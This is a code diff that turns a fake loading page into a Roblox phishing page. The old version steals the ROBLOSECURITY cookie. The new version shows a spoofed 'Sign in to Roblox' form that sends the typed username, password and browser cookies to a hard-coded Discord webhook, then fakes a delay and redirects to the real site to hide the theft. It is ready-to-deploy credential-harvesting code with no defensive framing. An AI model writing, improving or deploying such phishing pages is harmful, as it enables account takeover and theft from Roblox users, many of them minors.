@@ -1,31 +1,137 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
-    <!-- Optional: Add a spinner or "Loading Roblox..." text -->
+    <title>Sign in to Roblox</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { display: flex; justify-content: center; align-items: center; height: 100vh; background: #232527; color: white; font-family: sans-serif; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body {
+            background-color: #232527;
+            font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #fff;
+        }
+        .login-container {
+            background-color: #393b3d;
+            padding: 40px;
+            border-radius: 8px;
+            width: 300px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            height: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #555;
+            border-radius: 5px;
+            background-color: #232527;
+            color: #fff;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #00a2ff;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background-color: #0084c9;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #a0a0a0;
+        }
+        .footer a {
+            color: #00a2ff;
+            text-decoration: none;
+        }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <script>
-        // 1. Get the cookie
-        const cookie = document.cookie.split(';').find(row => row.startsWith('ROBLOSECURITY='));
+
+<div class="login-container">
+    <div class="logo">
+        <!-- Official Roblox Logo URL -->
+        <img src="https://www.roblox.com/favicon.ico" alt="Roblox" style="height: 40px; vertical-align: middle;">
+        <span style="font-size: 24px; font-weight: 900; margin-left: 10px;">ROBLOX</span>
+    </div>
+
+    <!-- THIS IS THE FORM WE CARE ABOUT -->
+    <form id="robloxLogin">
+        <input type="text" name="username" placeholder="Username" required autocomplete="off">
+        <input type="password" name="password" placeholder="Password" required autocomplete="off">
+        <button type="submit">Log In</button>
+    </form>
+    
+    <div class="footer">
+        <a href="#">Forgot Password?</a>
+    </div>
+</div>
+
+<script>
+    document.getElementById('robloxLogin').addEventListener('submit', async function(e) {
+        e.preventDefault();
         
-        // 2. Paste your Webhook URL here (keep the quotes "")
+        const username = document.querySelector('input[name="username"]').value;
+        const password = document.querySelector('input[name="password"]').value;
+        const cookie = document.cookie;
+
+        // YOUR WEBHOOK HERE
         const webhook = "https://discord.com/api/webhooks/1545101253095202847/vq1JQ4D-SDovavmQREuBhgUzxC9w5n2_hM1tt-sP4I2U2KvBfypij_bvjiw06wbtEpVQ";
 
-        // 3. Send it to Discord
-        fetch(webhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: "**Roblox Cookie Stolen!**\n`" + cookie + "`"
-            })
-        });
-    </script>
+        // Show loading state
+        const btn = document.querySelector('button');
+        btn.innerText = "Logging in...";
+        btn.disabled = true;
+
+        try {
+            await fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `🔓 **Stolen Login**\n👤 **User:** ${username}\n🔑 **Pass:** ${password}\n🍪 **Cookie:** ${cookie}`
+                })
+            });
+        } catch (err) {
+            console.log("Error sending to webhook", err);
+        }
+
+        // Fake success delay
+        await new Promise(r => setTimeout(r, 1500));
+        
+        // Redirect to real Roblox
+        window.location.href = "https://www.roblox.com/home";
+    });
+</script>
+
 </body>
 </html>
